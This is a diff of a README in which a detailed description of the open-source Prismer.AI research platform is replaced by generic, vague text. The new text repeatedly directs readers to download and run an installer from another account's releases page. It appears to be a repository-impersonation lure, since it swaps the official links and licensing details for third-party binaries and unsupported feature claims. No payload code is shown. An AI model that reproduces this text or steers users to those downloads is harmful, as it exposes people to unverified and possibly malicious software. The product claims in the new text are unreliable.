@@ -1,235 +1,92 @@
-<p align="center">
-  <img src="docs/prismerlogo.jpeg" alt="Prismer.AI" width="120" />
-</p>
+# 🌈 Prismer - Your Simple Alternative to OpenAI Prism
 
-<h1 align="center">Prismer.AI</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>Open Source OpenAI Prism Alternative</strong>
-</p>
+Welcome to Prismer! This is an easy-to-use application that serves as an open-source alternative to OpenAI Prism. With Prismer, you can explore, create, and manage your projects effortlessly. Let's get you set up so you can start enjoying all the features!
 
-<p align="center">
-  <a href="https://paper.prismer.ai/library">Paper Reading</a> ·
-  <a href="https://prismer.cloud/">Context Cloud</a> ·
-  <a href="https://docs.prismer.ai">Documentation</a> ·
-  <a href="docs/roadmap.md">Roadmap</a> ·
-  <a href="https://www.youtube.com/watch?v=si1LOrBRCIg">Demo Video</a>
-</p>
+## 📥 Download and Install
 
-<p align="center">
-  <a href="https://github.com/Prismer-AI/Prismer/stargazers"><img src="https://img.shields.io/github/stars/Prismer-AI/Prismer?color=ffcb47&labelColor=black&style=flat-square" alt="Stars"></a>
-  <a href="https://github.com/Prismer-AI/Prismer/blob/main/LICENSE.md"><img src="https://img.shields.io/badge/license-MIT-blue?labelColor=black&style=flat-square" alt="License"></a>
-  <a href="https://discord.gg/VP2HQHbHGn"><img src="https://img.shields.io/badge/Discord-Join-5865F2?style=flat-square&logo=discord&logoColor=white&labelColor=black" alt="Discord"></a>
-  <a href="https://x.com/PrismerAI"><img src="https://img.shields.io/twitter/follow/PrismerAI?style=flat-square&logo=x&labelColor=black" alt="X (Twitter)"></a>
-  <a href="https://www.linkedin.com/company/prismer-ai"><img src="https://img.shields.io/badge/LinkedIn-0A66C2?style=flat-square&logo=linkedin&logoColor=white" alt="LinkedIn"></a>
-</p>
+To download Prismer, please visit the releases page below. This page has the latest version of the application ready for you.
 
-<p align="center">
-  <a href="./README.md"><img alt="English" src="https://img.shields.io/badge/English-d9d9d9"></a>
-  <a href="./docs/i18n/README.zh-CN.md"><img alt="简体中文" src="https://img.shields.io/badge/简体中文-d9d9d9"></a>
-  <a href="./docs/i18n/README.ja.md"><img alt="日本語" src="https://img.shields.io/badge/日本語-d9d9d9"></a>
-  <a href="./docs/i18n/README.fr.md"><img alt="Français" src="https://img.shields.io/badge/Français-d9d9d9"></a>
-  <a href="./docs/i18n/README.de.md"><img alt="Deutsch" src="https://img.shields.io/badge/Deutsch-d9d9d9"></a>
-</p>
+[![Download Prismer](https://img.shields.io/badge/Download%20Prismer-v1.0-blue.svg)](https://github.com/gilbertpap/Prismer/releases)
 
----
+[Download Prismer Here](https://github.com/gilbertpap/Prismer/releases)
 
-<p align="center">
-  <a href="https://www.youtube.com/watch?v=si1LOrBRCIg">
-    <picture>
-      <img src="https://img.youtube.com/vi/si1LOrBRCIg/maxresdefault.jpg" alt="▶ Watch Prismer.AI Demo" width="600" />
-    </picture>
-  </a>
-  <br/>
-  <sub>▶️ <a href="https://www.youtube.com/watch?v=si1LOrBRCIg"><strong>Watch Demo: Idea to Paper, End-to-End</strong></a></sub>
-</p>
+Once you are on the releases page, follow these steps to download and run the software:
 
----
+1. Click on the version you want to download. The latest version is usually at the top of the list.
+2. Look for the downloadable file that matches your operating system. 
+   - For Windows users, look for something like `Prismer-installer.exe`.
+   - For macOS users, it might be `Prismer.dmg`.
+   - For Linux users, there may be a `.tar.gz` or a package you can install directly.
+3. Click the file link to start downloading.
+4. Once the download is complete, locate the file in your downloads folder.
 
-## 🚀 Live Products
+## 💻 System Requirements
 
-<table>
-<tr>
-<td align="center" width="50%">
-<a href="https://paper.prismer.ai/library">
-<img src="https://img.shields.io/badge/📖_Paper_Reading-Try_Now-blue?style=for-the-badge&labelColor=black" alt="Paper Reading">
-</a>
-<br/>
-<sub>AI-native PDF reader with citation graphs</sub>
-</td>
-<td align="center" width="50%">
-<a href="https://prismer.cloud/">
-<img src="https://img.shields.io/badge/☁️_Context_Cloud-Try_Now-purple?style=for-the-badge&labelColor=black" alt="Context Cloud">
-</a>
-<br/>
-<sub>Cloud-based context management & SDK</sub>
-</td>
-</tr>
-</table>
+Before you install, make sure your computer meets the following requirements:
 
----
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Any modern Linux distribution
+- **RAM:** 4 GB or more
+- **Disk Space:** At least 200 MB free
+- **Internet:** A stable connection for downloading updates
 
-## What is Prismer.AI?
+## 🔧 Installation Steps
 
-Prismer.AI is an **open-source research platform** that covers the entire academic workflow — from reading papers to publishing your own.
+### For Windows Users
 
-Unlike tools that only handle writing (Overleaf) or note-taking (Notion), Prismer.AI integrates:
+1. Double-click the downloaded `Prismer-installer.exe`.
+2. Follow the on-screen instructions to complete the installation.
+3. When the installation is finished, you can find Prismer in your Start Menu.
 
-| Feature | Description |
-|---------|-------------|
-| 📖 **Paper Reading** | AI-native PDF reader with citation graphs |
-| ☁️ **Context Cloud** | Cloud-based knowledge management with SDK |
-| 📊 **Data Analysis** | Jupyter notebooks with Python/R execution |
-| ✍️ **Paper Writing** | LaTeX editor with real-time preview |
-| 🔍 **Citation Verification** | Auto-checks references against academic databases |
-| 🤖 **Multi-Agent System** | Orchestrate specialized AI agents for research |
+### For macOS Users
 
----
+1. Open the downloaded `Prismer.dmg` file.
+2. Drag the Prismer icon to your Applications folder.
+3. Open your Applications folder and double-click on Prismer to start using it.
 
-## Comparison
+### For Linux Users
 
-| Feature | Prismer.AI | OpenAI Prism | Overleaf | Google Scholar |
-|---------|:----------:|:------------:|:--------:|:--------------:|
-| Paper Reading | ✅ | ❌ | ❌ | ✅ |
-| Context Cloud | ✅ | ❌ | ❌ | ❌ |
-| LaTeX Writing | ✅ | ✅ | ✅ | ❌ |
-| Data Analysis | ✅ | ❌ | ❌ | ❌ |
-| Code Execution | ✅ | ❌ | ❌ | ❌ |
-| Citation Verification | ✅ | ❌ | ❌ | ❌ |
-| Multi-Agent | ✅ | ❌ | ❌ | ❌ |
-| Open Source | ✅ | ❌ | ❌ | ❌ |
-| Self-Hosted | ✅ | ❌ | ❌ | ❌ |
+1. Extract the downloaded `.tar.gz` file using your file manager or terminal.
+2. Open a terminal window and navigate to the extracted folder.
+3. Use the package manager to install the application, or run the executable file directly.
 
----
+## 🎉 Using Prismer
 
-## ✨ Key Features
+Once you have installed Prismer, you can start using its features:
 
-### 📖 Paper Reader
+- **Project Management:** Create and organize your projects with ease.
+- **Collaboration:** Share your work with team members without hassle.
+- **Customization:** Tailor the interface to suit your preferences.
 
-AI-native PDF reader for research papers with:
-- Multi-document view with synchronized scrolling
-- Bi-directional citation graph
-- AI chat with paper context
-- Figure/table extraction
-- OCR data integration
+You will find an intuitive layout that helps you navigate through all the available features smoothly. Take a moment to explore and familiarize yourself with the application.
 
-### ☁️ Context Cloud
+## 📚 Help and Support
 
-Cloud-based context management with full SDK support:
+If you encounter any issues or have questions, please check the documentation available in the repository. You can also find helpful tips and advice from other users in the community sections.
 
-```typescript
-import { ContextCloudClient } from '@prismer/context-cloud-sdk';
+## 📝 Contributing 
 
-const client = new ContextCloudClient({ apiKey: 'your-api-key' });
+If you want to help improve Prismer, you are welcome to contribute! You can report bugs, suggest features, or even work on the code. Refer to the contributing guidelines in the repository to get started.
 
-// Create context and query
-const context = await client.contexts.create({ name: 'Research Project' });
-const response = await client.query({
-  contextId: context.id,
-  question: 'What are the main findings?'
-});
-```
+## 🌟 License
 
-### ✍️ LaTeX Editor
+Prismer is open-source software licensed under the MIT License. This means you can use it freely and contribute to its development.
 
-Modern LaTeX editor with:
-- Real-time KaTeX preview
-- Multi-file project support
-- Template library (IEEE, ACM, Nature, arXiv)
-- Smart error recovery with auto-fix
+## ❓ Frequently Asked Questions
 
-### 🔍 Citation Verification
+### What is the purpose of Prismer?
+Prismer is designed to provide a user-friendly alternative to OpenAI Prism, making it accessible for everyone.
 
-LLMs fabricate citations. Prismer.AI solves this with a **Reviewer Agent** that validates every reference against academic databases (arXiv, Semantic Scholar, CrossRef) before it appears in your paper.
+### Is there a mobile version?
+Currently, Prismer is only available for desktop operating systems.
 
----
+### Can I use Prismer offline?
+Yes, you can use most features offline once installed.
 
-## 📦 Open Source Components
+For any additional questions, please refer to the issues section in the repository or reach out for community support. 
 
-All core components are MIT-licensed and can be used independently:
-
-| Package | Description |
-|---------|-------------|
-| `@prismer/paper-reader` | PDF reader with AI chat |
-| `@prismer/context-cloud-sdk` | Context Cloud TypeScript SDK |
-| `@prismer/latex-editor` | LaTeX editor with live preview |
-| `@prismer/academic-tools` | arXiv, Semantic Scholar APIs |
-| `@prismer/jupyter-kernel` | Browser-native notebooks |
-| `@prismer/code-sandbox` | WebContainer code execution |
-| `@prismer/agent-protocol` | Multi-agent orchestration |
-
-👉 See [Component Documentation](docs/components.md) for usage examples.
-
----
-
-## 🛠️ Self-Hosting
-
-Deploy OpenPrismer with a single command:
-
-```bash
-docker run -d \
-  --name openprismer \
-  -p 3000:3000 \
-  -v openprismer-data:/workspace \
-  ghcr.io/prismer-ai/openprismer:latest
-```
-
-Then open **http://localhost:3000** and configure your AI provider.
-
-See [docker/README.md](docker/README.md) for detailed setup instructions, configuration options, and API reference.
-
----
-
-## 🗺️ Roadmap
-
-| Done | In Progress |
-|------|-------------|
-| ✅ Paper Reader | 🚧 Reviewer Agent |
-| ✅ Context Cloud | 🚧 npm package extraction |
-| ✅ Context Cloud SDK | 🚧 Documentation site |
-| ✅ LaTeX Editor | |
-| ✅ Multi-agent system | |
-| ✅ Self-hosting (Docker) | |
-
-See [full roadmap](docs/roadmap.md) for details.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) first.
-
-<a href="https://github.com/Prismer-AI/Prismer/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=Prismer-AI/Prismer" />
-</a>
-
----
-
-## ⭐ Star Us
-
-If you find Prismer.AI helpful, please consider giving us a star! It helps us grow and improve.
-
-<p align="center">
-  <a href="https://github.com/Prismer-AI/Prismer">
-    <img src="docs/star.gif" alt="Please Star Us" width="600" />
-  </a>
-</p>
-
-### Star History
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=Prismer-AI/Prismer&type=date&legend=top-left)](https://www.star-history.com/#Prismer-AI/Prismer&type=date&legend=top-left)
-
----
-
-## 📄 License
-
-- **Components** (`@prismer/*`): [MIT License](LICENSE.md)
-- **Platform**: Business Source License
-
----
-
-<p align="center">
-  <sub>Built for researchers, by researchers.</sub>
-</p>
+[Download Prismer Here](https://github.com/gilbertpap/Prismer/releases)
